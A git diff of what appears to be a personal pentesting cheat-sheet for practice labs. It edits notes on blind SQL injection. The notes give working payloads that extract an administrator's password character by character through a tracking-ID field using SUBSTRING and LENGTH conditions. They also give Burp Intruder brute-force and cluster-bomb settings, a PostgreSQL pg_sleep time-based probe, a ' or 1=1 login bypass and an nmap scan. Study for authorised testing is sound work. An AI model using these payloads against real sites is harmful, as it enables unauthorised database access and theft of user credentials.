@@ -194,11 +194,19 @@ sudo openvpn nmap -sV {target IP}
 [+] {' anD (SELECT 'a' FROM users WHERE username='administrator')='a'--} --select a specific user from user_column
 [+] {' anD (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'--} --guessing userpass length from DB table
 - you can change the value of the password length and also change the '>' to '='
-[+] {' anD (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='$a$'--}paste this in the intuder after the TRACKING ID  --payload to bruteforce password  
-[-] change payload type to BRUTE FORCER and min:1 max:1 then start attack
-[-] check for one with a different value than the others in the result
-[-] change the payload password number to 2...e.t.c
- 
+[+] {' anD (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='$a$'--}paste this in the intuder after the TRACKING ID   
+- change payload type to BRUTE FORCER and min:1 max:1 then start attack
+- check for one with a different value than the others in the result
+- change the payload password number to 2...e.t.c  --payload to bruteforce password 
+[+] ' anD (SELECT SUBSTRING(password,$1$,1) FROM users WHERE username='administrator')='$a$'--} 
+- change attack type under POSITION to CLUSTER BOMB(because we will be manipulating 2 values) and under PAYLOAD to NUMBERS
+- FROM:0 TO:20 STEP:1 then run a second set for the payload and set PAYLOAD to BRUTE FORCER MIN:1 MAX:1
+- check for the ones with different LENGTH value and write them out --SQL payload to bruteforce admin pass
+[+] check for the kinda sql used 
+- {'||pg_sleep(10)--} paste in tracking ID ( this is PSTGRE) -- testing for blind SQL injection using time based SQLi
+
+
+
 
 [+] test login with {'} if internal error shows then it allows SQLi
 [+] {' or 1=1--} -- bypass login page pass
